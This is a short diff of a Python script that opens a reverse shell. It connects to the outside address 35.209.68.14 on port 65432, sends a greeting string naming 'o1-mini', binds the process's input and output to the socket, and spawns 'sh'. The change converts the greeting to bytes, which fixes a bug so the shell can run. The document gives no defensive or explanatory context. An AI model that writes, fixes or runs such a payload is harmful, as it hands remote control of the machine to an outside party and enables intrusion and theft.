@@ -6,6 +6,6 @@ import pty
 
 s = socket.socket()
 s.connect(("35.209.68.14", 65432))
-s.send("selector o1-mini local-text success")
+s.send(b"selector o1-mini local-text success")
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn("sh")
